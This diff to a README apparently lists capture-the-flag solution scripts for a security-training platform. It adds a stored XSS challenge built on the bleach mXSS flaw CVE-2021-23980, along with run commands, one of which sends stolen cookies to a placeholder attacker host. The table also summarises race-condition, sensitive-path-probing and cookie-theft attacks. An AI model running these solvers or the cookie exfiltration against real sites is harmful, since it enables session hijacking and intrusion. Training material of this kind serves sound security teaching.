@@ -23,6 +23,7 @@ vulnerability in the LoopyMart security-training platform.
 | 9 | [wallet-race-condition/](wallet-race-condition/) | `wallet_race` | Web / Race Condition | Medium–Hard | Concurrent `POST /wallet/redeem` TOCTOU → multiply cashback → buy flag |
 | 10 | [sensitive-files-enum/](sensitive-files-enum/) | *(recon utility)* | Recon | Easy | Async unauthenticated probe of 175+ common sensitive paths |
 | 11 | [puppeteer-mock-cookie/](puppeteer-mock-cookie/) | `puppeteer_mock_cookie` | Web / Cookie Security | Easy–Medium | Admin JWT → `mock_flag` cookie (not HttpOnly) read by Puppeteer |
+| 12 | [stored-xss-bleach-mxss/](stored-xss-bleach-mxss/) | `stored_xss_bleach_mxss` | Web / Stored XSS | Hard | CVE-2021-23980: bleach 3.2.3 mXSS + regex bypass via HTML entity encoding |
 
 ---
 
@@ -71,6 +72,14 @@ python solutions/sensitive-files-enum/solve.py --url $URL
 cd solutions/puppeteer-mock-cookie && npm install
 node solve.js --email $ADMIN_EMAIL --password $ADMIN_PASS --url $URL
 cd -
+
+# Option B: Python fallback
+python solutions/puppeteer-mock-cookie/solve.py --email $ADMIN_EMAIL --password $ADMIN_PASS --url $URL
+
+# 12 — Stored XSS via bleach mXSS (CVE-2021-23980) — user creds with delivered order
+python solutions/stored-xss-bleach-mxss/solve.py --email $EMAIL --password $PASS --url $URL
+# exfiltrate cookies to your server:
+python solutions/stored-xss-bleach-mxss/solve.py --email $EMAIL --password $PASS --url $URL --exfil https://attacker.example/steal
 
 # Option B: Python fallback  
 python solutions/puppeteer-mock-cookie/solve.py --email $ADMIN_EMAIL --password $ADMIN_PASS --url $URL
